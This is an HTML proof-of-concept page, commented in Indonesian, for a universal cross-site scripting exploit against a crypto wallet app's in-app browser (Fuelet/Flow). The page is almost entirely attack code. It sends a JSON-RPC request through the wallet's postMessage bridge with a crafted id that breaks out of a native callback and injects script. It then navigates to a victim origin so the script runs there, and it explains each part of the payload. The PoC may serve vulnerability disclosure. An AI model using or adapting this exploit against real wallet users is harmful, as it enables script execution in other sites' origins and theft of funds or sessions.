<!DOCTYPE html>
<html>
<head>
    <title>Flow Wallet PoC</title>
    <style>
        body { background: #000; color: #00ef8b; text-align: center; font-family: sans-serif; padding-top: 100px; }
        button { background: #00ef8b; padding: 20px; border-radius: 10px; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <h1>Flow DApp Test</h1>
    <p>Klik tombol di bawah untuk memicu eksploitasi:</p>
    <button onclick="runExploit()">CLICK TO BYPASS</button>

    <script>
        function runExploit() {
            // Target situs korban
            const victimSite = "https://www.google.com";

            /* PAYLOAD ANALISIS:
               1. "); -> Menutup fungsi receiveResponseFromFlutter("");
               2. alert(origin); -> Menjalankan perintah jahat.
               3. // -> Memberikan komentar pada sisa kode agar tidak terjadi Syntax Error.
            */
            const maliciousId = '");alert("UXSS Berhasil! Origin: " + origin);//';

            const requestData = {
                type: 'request',
                target: 'FuelContentScript', // Sesuaikan target jika aplikasi menggunakan penamaan berbeda
                connectorName: 'Fuelet Wallet',
                request: {
                    jsonrpc: '2.0',
                    id: maliciousId,
                    method: 'connect',
                    params: {}
                }
            };

            // Deteksi objek wallet (postMessage bridge)
            const wallet = window.FueletWallet || window.FlowWallet || window.fcl;

            if (wallet) {
                // 1. Kirim pesan ke Native
                wallet.postMessage(JSON.stringify(requestData));

                // 2. Navigasi ke origin korban dengan jeda sedikit lebih lama (150ms-200ms)
                // Jeda ini krusial agar postMessage terkirim sebelum halaman berpindah
                setTimeout(() => {
                    window.location.href = victimSite;
                }, 200); 
            } else {
                alert("Objek Wallet tidak ditemukan. Pastikan buka di browser dompet!");
            }
        }
    </script>
</body>
</html>
